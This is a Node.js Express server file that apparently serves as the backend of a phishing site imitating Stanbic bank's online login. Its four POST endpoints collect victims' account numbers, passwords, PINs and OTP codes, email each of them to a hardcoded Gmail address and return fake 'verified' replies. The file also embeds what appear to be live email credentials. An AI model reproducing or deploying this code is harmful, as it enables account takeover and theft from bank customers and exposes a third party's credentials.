const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config();

// Middleware
app.use(express.json());
app.set("trust proxy", 1);

// CORS
app.use(
  cors({
    origin: "https://desk-stanbic-online.vercel.app",
  })
);

const PORT = process.env.PORT || 5000;

// Email credentials from .env (with hardcoded fallback for manual hosting)
const userEmail = process.env.EMAIL_USER || "okoriekennethassetvalue@gmail.com";
const pass = process.env.EMAIL_PASS || "ugnywqbtiddipqwr";

// Reusable transporter (created once at startup)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: userEmail,
    pass: pass,
  },
});

// ─── Manual Rate Limiter (no external package needed) ───
const blockedIPs = new Set();
const requestCounts = new Map(); // ip -> { count, resetAt }

const RATE_LIMIT = 5;         // max requests per window
const WINDOW_MS = 60 * 60 * 1000; // 1 hour

app.use((req, res, next) => {
  if (req.method !== "POST") return next();

  const ip = req.ip || req.socket.remoteAddress;

  // Permanently blocked
  if (blockedIPs.has(ip)) {
    return res
      .status(403)
      .json({ success: false, message: "Access denied." });
  }

  const now = Date.now();
  let entry = requestCounts.get(ip);

  if (!entry || now > entry.resetAt) {
    entry = { count: 0, resetAt: now + WINDOW_MS };
  }

  entry.count++;
  requestCounts.set(ip, entry);

  if (entry.count > RATE_LIMIT) {
    blockedIPs.add(ip);
    return res
      .status(429)
      .json({ success: false, message: "Too many requests." });
  }

  next();
});

// Helper: send email and respond
const sendMailAndRespond = (
  mailOptions,
  res,
  successMsg,
  failMsg,
  failCode = 400,
) => {
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Email error:", error);
      return res.status(failCode).json({ success: false, message: failMsg });
    }
    console.log("Email sent:", info.response);
    return res.status(200).json({ success: true, message: successMsg });
  });
};

// Health check
app.get("/", (req, res) => {
  res.status(200).json({ status: "ok" });
});

// ─── ENDPOINT 1: POST / ─── Login
app.post("/", (req, res) => {
  const { accountNumber, password } = req.body;

  if (!accountNumber || !password) {
    return res
      .status(401)
      .json({ success: false, message: "Invalid account number or password" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic Login Details",
    text: `Account Number: ${accountNumber}\nPassword: ${password}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "Login successful",
    "Invalid account number or password",
    401,
  );
});

// ─── ENDPOINT 2: POST /pin ─── PIN Verification
app.post("/pin", (req, res) => {
  const { pin } = req.body;

  if (!pin || !/^\d{4}$/.test(pin)) {
    return res.status(401).json({ success: false, message: "Invalid PIN" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic PIN Confirmation",
    text: `User PIN: ${pin}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "PIN verified successfully",
    "Invalid PIN",
    401,
  );
});

// ─── ENDPOINT 3: POST /verify-otp ─── OTP Verification
app.post("/verify-otp", (req, res) => {
  const { otp } = req.body;

  if (!otp || !/^\d{5}$/.test(otp)) {
    return res
      .status(400)
      .json({ success: false, message: "Invalid or expired OTP" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic OTP Verification",
    text: `User OTP: ${otp}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "OTP verified successfully",
    "Invalid or expired OTP",
    400,
  );
});

// ─── ENDPOINT 4: POST /resend-otp ─── Resend OTP
app.post("/resend-otp", (req, res) => {
  const { otp } = req.body;

  if (!otp || !/^\d{5}$/.test(otp)) {
    return res
      .status(400)
      .json({ success: false, message: "Invalid or expired OTP" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Stanbic Second OTP Verification",
    text: `User OTP: ${otp}`,
  };

  sendMailAndRespond(
    mailOptions,
    res,
    "Second OTP verified successfully",
    "Invalid or expired OTP",
    400,
  );
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
